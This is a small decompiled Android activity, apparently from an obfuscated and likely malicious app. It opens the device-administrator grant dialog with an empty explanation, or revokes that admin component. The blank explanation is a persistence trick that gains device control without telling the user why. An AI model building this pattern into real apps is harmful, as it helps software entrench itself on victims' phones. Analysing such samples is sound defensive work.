package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0022c;

/* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.a.b */
/* JADX INFO: loaded from: classes.dex */
public class ActivityC0048b extends Activity {

    /* JADX INFO: renamed from: a */
    C0022c f490a = new C0022c();

    /* JADX INFO: renamed from: b */
    private C0049c f491b;

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f491b = new C0049c(this);
        if (getIntent().getStringExtra("str").equals("start")) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", this.f491b.m295a());
            this.f490a.getClass();
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "");
            startActivityForResult(intent, 100);
        } else {
            ((DevicePolicyManager) getSystemService("device_policy")).removeActiveAdmin(new ComponentName(this, (Class<?>) DeviceAdminReceiverC0047a.class));
        }
        finish();
    }
}
